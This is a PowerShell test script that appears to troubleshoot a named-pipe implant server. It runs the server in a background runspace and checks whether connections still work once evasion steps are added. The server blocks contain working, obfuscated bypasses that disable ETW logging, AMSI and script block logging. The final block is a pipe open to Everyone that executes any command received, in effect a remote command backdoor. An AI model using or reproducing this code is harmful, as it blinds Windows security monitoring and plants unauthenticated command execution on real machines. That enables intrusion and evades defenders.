
# Runs server in a background runspace (same process) to eliminate startup timing.
# Narrows down exactly what breaks WaitForConnection.

function Test-InProcess([string]$label, [scriptblock]$serverBlock, [string]$pipeName) {
    $rs = [powershell]::Create()
    [void]$rs.AddScript($serverBlock).AddArgument($pipeName)
    $handle = $rs.BeginInvoke()
    Start-Sleep -Milliseconds 300  # let server reach WaitForConnection

    try {
        $c = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pipeName, 'InOut')
        $c.Connect(2000)
        if ($c.IsConnected) {
            $sr = New-Object System.IO.StreamReader($c)
            $line = $sr.ReadLine()
            $c.Dispose()
            Write-Host "  [PASS] $label => '$line'" -ForegroundColor Green
        } else {
            Write-Host "  [FAIL] $label => IsConnected=False" -ForegroundColor Red
        }
    } catch {
        Write-Host "  [FAIL] $label => $_" -ForegroundColor Red
    }
    try { $rs.Stop() } catch {}
    $rs.Dispose()
}

Write-Output ""
Write-Output "=== In-Process Server Tests ==="
Write-Output ""

$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
Write-Output "SID: $SID"
Write-Output ""

# 1 - Bare pipe
Test-InProcess "Bare pipe" {
    param($pn)
    $p = New-Object System.IO.Pipes.NamedPipeServerStream($pn, 'InOut')
    $p.WaitForConnection()
    $w = New-Object System.IO.StreamWriter($p); $w.WriteLine('bare-ok'); $w.Flush(); $p.Dispose()
} (-join ((65..90+97..122)|Get-Random -Count 10|%{[char]$_}))

# 2 - PipeSecurity with Everyone
Test-InProcess "PipeSecurity Everyone" {
    param($pn)
    $sec = New-Object System.IO.Pipes.PipeSecurity
    $sid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
    $ar  = New-Object System.IO.Pipes.PipeAccessRule($sid,'FullControl','Allow')
    $sec.AddAccessRule($ar)
    $p = New-Object System.IO.Pipes.NamedPipeServerStream($pn,'InOut',1,'Byte','None',4096,4096,$sec)
    $p.WaitForConnection()
    $w = New-Object System.IO.StreamWriter($p); $w.WriteLine('sec-ok'); $w.Flush(); $p.Dispose()
} (-join ((65..90+97..122)|Get-Random -Count 10|%{[char]$_}))

# 3 - Add ETW bypass before pipe
Test-InProcess "ETW bypass + pipe" {
    param($pn)
    try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue($null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue($_,[Byte]0)}}catch{}
    $sec = New-Object System.IO.Pipes.PipeSecurity
    $sid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
    $sec.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule($sid,'FullControl','Allow')))
    $p = New-Object System.IO.Pipes.NamedPipeServerStream($pn,'InOut',1,'Byte','None',4096,4096,$sec)
    $p.WaitForConnection()
    $w = New-Object System.IO.StreamWriter($p); $w.WriteLine('etw-ok'); $w.Flush(); $p.Dispose()
} (-join ((65..90+97..122)|Get-Random -Count 10|%{[char]$_}))

# 4 - Add AMSI bypass (field enumeration) before pipe
Test-InProcess "AMSI bypass + pipe" {
    param($pn)
    try{$_at=[Ref].Assembly.GetType([string]::new([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));$_at.GetFields([Reflection.BindingFlags]'NonPublic,Static')|%{if($_.FieldType-eq[bool]){$_.SetValue($null,$true)}elseif($_.FieldType-eq[IntPtr]){$_.SetValue($null,[IntPtr]::Zero)}}}catch{}
    $sec = New-Object System.IO.Pipes.PipeSecurity
    $sid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
    $sec.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule($sid,'FullControl','Allow')))
    $p = New-Object System.IO.Pipes.NamedPipeServerStream($pn,'InOut',1,'Byte','None',4096,4096,$sec)
    $p.WaitForConnection()
    $w = New-Object System.IO.StreamWriter($p); $w.WriteLine('amsi-ok'); $w.Flush(); $p.Dispose()
} (-join ((65..90+97..122)|Get-Random -Count 10|%{[char]$_}))

# 5 - Add SBL bypass before pipe
Test-InProcess "SBL bypass + pipe" {
    param($pn)
    try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue($null,[Boolean]$false)}catch{}
    $sec = New-Object System.IO.Pipes.PipeSecurity
    $sid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
    $sec.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule($sid,'FullControl','Allow')))
    $p = New-Object System.IO.Pipes.NamedPipeServerStream($pn,'InOut',1,'Byte','None',4096,4096,$sec)
    $p.WaitForConnection()
    $w = New-Object System.IO.StreamWriter($p); $w.WriteLine('sbl-ok'); $w.Flush(); $p.Dispose()
} (-join ((65..90+97..122)|Get-Random -Count 10|%{[char]$_}))

# 6 - Command loop (full server behavior, no bypasses)
Test-InProcess "Full loop, no bypasses" {
    param($pn)
    $sec = New-Object System.IO.Pipes.PipeSecurity
    $sid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
    $sec.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule($sid,'FullControl','Allow')))
    $p = New-Object System.IO.Pipes.NamedPipeServerStream($pn,'InOut',1,'Byte','None',4096,4096,$sec)
    $p.WaitForConnection()
    $r = New-Object System.IO.StreamReader($p)
    $w = New-Object System.IO.StreamWriter($p)
    while ($true) {
        $cmd = $r.ReadLine()
        if ($cmd -eq 'exit') { break }
        $res = & ([scriptblock]::Create($cmd)) 2>&1 | Out-String
        $res -split [char]10 | % { $w.WriteLine($_.TrimEnd()) }
        $w.WriteLine('ENDMARK'); $w.Flush()
    }
    $p.Disconnect(); $p.Dispose()
} (-join ((65..90+97..122)|Get-Random -Count 10|%{[char]$_}))

Write-Output ""
Write-Output "Done."
